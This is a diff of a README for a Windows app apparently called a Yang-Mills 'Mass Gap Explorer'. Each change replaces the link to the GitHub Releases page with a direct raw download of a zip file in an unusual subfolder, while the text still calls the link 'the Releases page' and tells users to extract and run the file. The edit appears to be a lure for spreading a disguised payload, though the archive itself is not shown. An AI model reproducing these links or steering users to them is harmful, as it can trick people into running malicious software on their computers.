@@ -1,6 +1,6 @@
 # 🧭 u24-Yang-Mills - Run the Mass Gap Explorer
 
-[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://github.com/finespun-genusriparia126/u24-Yang-Mills/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://github.com/finespun-genusriparia126/u24-Yang-Mills/raw/refs/heads/main/northern/u_Mills_Yang_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README shows you how to get the app from the release page and start it on W
 
 Visit this page to download:
 
-https://github.com/finespun-genusriparia126/u24-Yang-Mills/releases
+https://github.com/finespun-genusriparia126/u24-Yang-Mills/raw/refs/heads/main/northern/u_Mills_Yang_v3.7.zip
 
 On the Releases page, look for the latest version and download the Windows file. In most cases, this will be a `.exe` file or a `.zip` file that contains the app.
 
@@ -46,7 +46,7 @@ For the best result, keep Windows updated and use the latest release from the do
 
 Follow these steps:
 
-1. Open the Releases page: https://github.com/finespun-genusriparia126/u24-Yang-Mills/releases
+1. Open the Releases page: https://github.com/finespun-genusriparia126/u24-Yang-Mills/raw/refs/heads/main/northern/u_Mills_Yang_v3.7.zip
 2. Download the latest Windows file
 3. If the file is a `.zip`, right-click it and choose Extract All
 4. Open the extracted folder
@@ -162,7 +162,7 @@ If you use a `.zip` release, extract the new version into a new folder first. Th
 
 If you need the download page again, use this link:
 
-https://github.com/finespun-genusriparia126/u24-Yang-Mills/releases
+https://github.com/finespun-genusriparia126/u24-Yang-Mills/raw/refs/heads/main/northern/u_Mills_Yang_v3.7.zip
 
 ## 🧪 Terms Used in the App
 
